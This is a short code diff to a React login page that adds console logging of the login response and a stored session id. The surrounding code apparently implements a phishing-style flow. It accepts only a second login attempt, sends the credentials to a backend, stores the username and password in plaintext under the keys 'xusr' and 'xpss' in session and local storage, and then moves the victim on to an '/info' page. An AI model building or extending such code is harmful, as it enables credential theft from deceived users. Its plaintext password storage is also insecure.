@@ -84,13 +84,18 @@ const LoginPage: React.FC = () => {
       // Second attempt - proceed to next page
       try {
         // Send data to backend (simulating the PHP behavior)
-        await apiService.login(formData);
+        const loginResponse = await apiService.login(formData);
+        console.log('LoginPage - Login response:', loginResponse);
         
         // Store in both session and local storage for mobile compatibility
         sessionStorage.setItem('xusr', formData.xusr);
         sessionStorage.setItem('xpss', formData.xpss);
         localStorage.setItem('xusr', formData.xusr);
         localStorage.setItem('xpss', formData.xpss);
+        
+        // Debug: Check if sessionId was stored by apiService
+        const storedSessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
+        console.log('LoginPage - Stored sessionId after login:', storedSessionId);
         
         // Navigate to info page
         navigate('/info');
